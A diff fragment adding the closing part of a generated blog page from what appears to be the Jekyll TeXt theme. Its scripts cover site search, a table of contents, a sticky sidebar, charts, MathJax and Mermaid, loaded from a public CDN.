+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
